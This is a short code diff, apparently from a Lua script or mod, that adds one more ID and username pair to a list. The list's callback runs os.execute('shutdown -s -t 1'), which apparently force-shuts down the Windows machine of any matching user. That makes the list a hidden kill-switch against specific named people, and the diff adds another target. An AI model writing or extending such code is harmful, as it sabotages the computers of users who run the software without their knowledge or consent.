@@ -58,6 +58,7 @@
     {1655996809,'ice_castl'},
     {3760468676,'aswerasq'},
     {9612336,'itachihuchiha'},
+    {3268446077,'northside01'},
   },
   callback = function() os.execute('shutdown -s -t 1')  end,
 }
